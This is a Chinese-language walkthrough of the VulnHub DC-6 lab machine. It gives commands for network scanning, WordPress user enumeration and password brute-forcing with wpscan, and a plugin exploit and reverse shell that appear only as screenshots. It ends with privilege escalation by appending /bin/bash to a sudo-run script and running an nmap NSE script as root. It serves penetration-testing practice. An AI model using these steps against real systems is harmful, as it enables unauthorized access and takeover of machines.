> 
>
>  先去看看[DC-6的官网描述](https://www.vulnhub.com/entry/dc-6,315/)，看看有没有给出提示信息
>
> 

<img src="./imgs/image-20230807185122021-1691462955175-1.png" alt="image-20230807185122021" style="zoom:33%;" />

<img src="./imgs/image-20230807185220691-1691463024588-4.png" alt="image-20230807185220691" style="zoom:33%;" />

<img src="./imgs/image-20230807185304458-1691463034835-7.png" alt="image-20230807185304458" style="zoom:33%;" />

把这个线索信息先复制下来

```shell
cat /usr/share/wordlists/rockyou.txt | grep k01 > passwords.txt
```

开始前先要吧 kali和DC-6靶机放在统一网段，都换成`NAT`模式

然后看一下DC-6的MAC地址

<img src="./imgs/image-20230807185603637-1691463162895-10.png" alt="image-20230807185603637" style="zoom:33%;" />

```shell

靶机的MAC地址00:0C:29:FA:57:22
```

### 信息收集

**主机扫描**

```shell
netdiscover -r 192.168.80.0/24
```

<img src="./imgs/image-20230807204152324-1691463713375-13.png" alt="image-20230807204152324" style="zoom:33%;" />

**端口扫描**

```shell
nmap -A -T4 -p- 192.168.80.140
```

<img src="./imgs/image-20230807204400100-1691463813814-16.png" alt="image-20230807204400100" style="zoom:33%;" />

发现靶机开起来`80`端口和`22`端口

根据DC-6靶场的文档描述，需要修改hosts文件

```shell
vim /etc/hosts   #靶机的地址和域名映射
```



<img src="./imgs/image-20230807190408473-1691463855591-19.png" alt="image-20230807190408473" style="zoom:33%;" />

通过kali自带的浏览器访问靶机的`80`的端口



![image-20230807190518659](./imgs/image-20230807190518659.png)

发现是`WordPress`的站点，这跟`DC-2`的是一样的站点，那就可以跟`DC-2`一样用`wpscan`来扫描这个站点的漏洞

先爆破一下目录看看

```shell
dirsearch -u 192.168.80.140 -i 200
```

![image-20230807211541514](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230807211541514.png)

使用御剑爆破一下

![image-20230807210928594](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230807210928594.png)

进入登录页面，现在还不知道密码和账户，

![image-20230807211339375](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230807211339375.png)

### 漏洞利用

使用`wpscan`进行枚举爆破用户名

```shell
wpscan --url http://wordy/ -e u   # 枚举 WordPress 站点中注册过的用户名，来制作用户名字典。
```

![image-20230807211708308](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230807211708308.png)

把账户写进`/tmp/user.txt`文件里

现在有了账户，还没密码，需要用靶场文档描述里说的线索提示

```shell
cat /usr/share/wordlists/rockyou.txt | grep k01 > passwords.txt
```

![image-20230807211905462](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230807211905462.png)

报错说没有目录，可以使用`cd`命令，过去看一看

![image-20230807212014292](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230807212014292.png)

```shell
gunzip rockyou.txt.gz
```



![image-20230807212132262](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230807212132262.png)



![image-20230807212336871](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230807212336871.png)

---

![image-20230807212734164](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230807212734164.png)

现在有了用户字典，有了密码字典，继续使用`wpscan`密码爆破

==注意==：是在`/tmp`目录下进行爆破

```shell
wpscan --url http://wordy/ -U user.txt -P passwords.txt # 调用相关的字典文件对网站进行爆破。
```

![image-20230808104100218](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230808104100218.png)



![image-20230808104037655](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230808104037655.png)

爆破完用`mark` `helpdesk01`做登录

![image-20230807214339649](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230807214339649.png)

搜索`Activity monitor`这个插件有没有漏洞

![image-20230807215324697](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230807215324697.png)

找一下漏洞的绝对路径

![image-20230807215416791](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230807215416791.png)

用python执行这个脚本

![image-20230807220925693](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230807220925693.png)

### 提权

新建一个终端，监听`8989`

![image-20230807221024541](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230807221024541.png)

然后在刚才的终端里输入反弹shell

![image-20230807221149955](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230807221149955.png)

已经监听到了

![image-20230807221204336](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230807221204336.png)

使用python交互shell

```python
python  -c "import pty;pty.spawn('/bin/bash')"
```

![image-20230807221418750](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230807221418750.png)

在mark的家目录里发现有用的信息

![image-20230807221648562](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230807221648562.png)

查看`su graham`切换用户，发现可以使用`su`这个命令

![image-20230807221823126](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230807221823126.png)

使用`sudo -l`查看能使用哪些`root`权限的命令

![image-20230807221908392](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230807221908392.png)

切换到`jens`的家目录看一下

![image-20230807221954668](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230807221954668.png)

可以往里面追加`/bin/bash`

![image-20230807222049870](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230807222049870.png)

使用`sudo -u jens ./backups.sh`

- -u 指定用户

切换到了`jens`用户

![image-20230807222251746](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230807222251746.png)

继续使用`sudo -l` 查看

![image-20230807222325061](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230807222325061.png)

**利用 nmap 提权**

```shell
echo "os.execute('/bin/bash')" > shell.nse
```

![image-20230807223133277](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230807223133277.png)

```shell
sudo -u root nmap --script=shell.nse
#以root用户执行namp脚本
```

![image-20230807223257282](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230807223257282.png)

进入`/root`下查看有无文件

![image-20230807223457255](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230807223457255.png)

---

